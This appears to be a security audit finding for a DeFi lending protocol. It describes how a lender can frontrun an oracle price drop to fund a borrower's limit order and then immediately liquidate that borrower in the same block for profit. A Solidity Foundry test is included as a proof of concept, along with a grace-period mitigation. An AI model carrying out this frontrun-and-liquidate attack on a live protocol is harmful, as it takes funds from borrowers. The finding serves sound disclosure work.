# Vulnerability details

## Impact
Lenders can steal money from borrowers when market conditions are very volatile.
## Proof of Concept
In cases where the price of collateral would drop very fast, it can be exploited by lenders.

Let's look at the following scenario:
- Bob (borrower) places a borrow limit order.
- Some time passes
- Alice (lender & liquidator) will see that the next oracle update would push Bob's position underwater if it were active.
- Alice will do the following steps:   
    1.) Lend tokens to Bob by frontrunning oracle update   
    2.) Oracle update tx    
    3.) Liquidate Bob immediately by backrunning the oracle update.

This has to be done in a single block, where an oracle update would push the yet inactive position of the borrower underwater.

#### Coded POC
Add this test to `./test/local/actions/Liquidate.t.sol`, add `import "forge-std/console.sol";`and run with `forge test --match-path ./test/local/actions/Liquidate.t.sol -vvv`

```solidity
function testLenderSteal() public {
    _setPrice(1e18);

    _deposit(alice, weth, 300e18);
    _deposit(alice, usdc, 300e6);
    _deposit(bob, weth, 150e18);
    _deposit(bob, usdc, 150e6);
    _deposit(liquidator, weth, 100e18);
    _deposit(liquidator, usdc, 100e6);

    _sellCreditLimit(bob, 0.1e18, 365 days);

    // Amount to lend
    uint256 amount = 65e6;

    uint256 colBefore = size.getUserView(alice).collateralTokenBalance;

    // Alice lends to Bob by frontrunning the oracle update
    uint256 debtPositionId = _buyCreditMarket(alice, bob, RESERVED_ID, amount, 365 days, true);

    uint256 newPrice = 0.5e18;

    // Bob's collateral ratio should be above 1.5
    assertTrue(size.collateralRatio(bob) > 1.5e18);
    // Price suddenly drops
    _setPrice(newPrice);
    // Bob's collateral ratio should be below 1.3
    assertTrue(size.collateralRatio(bob) < 1.3e18);

    // Bob's debt position should be liquidatable
    assertTrue(size.isDebtPositionLiquidatable(debtPositionId));

    // Alice (lender) liquidates Bob's debt position by backrunning the oracle update
    _liquidate(alice, debtPositionId);

    uint256 colAfter = size.getUserView(alice).collateralTokenBalance;
    
    /* 
        Alice should have made a profit. The amount of collateral she receives converted to USDC 
        should be greater than the amount she lent to Bob.
    */
    assertTrue((colAfter - colBefore) * newPrice > amount);
    
    uint256 tokenFromLiqudation = (colAfter - colBefore) * newPrice / 1e18 / 1e12;
    console.log("Collateral before      : ", colBefore);
    console.log("Collateral after       : ", colAfter);
    console.log("Tokens lent            : ", amount);
    console.log("Tokens from liquidation: ", tokenFromLiqudation);
    console.log("Profit                 : ", tokenFromLiqudation - amount);
    // Bob is liqudiated.
    assertEq(_state().bob.debtBalance, 0);
}
```

## Tools Used
Manual Review
## Recommended Mitigation Steps
Prevent lending and liquidation of the same loan in a single block. Add a grace period when the loan becomes active so it cannot be liquidated immediately.
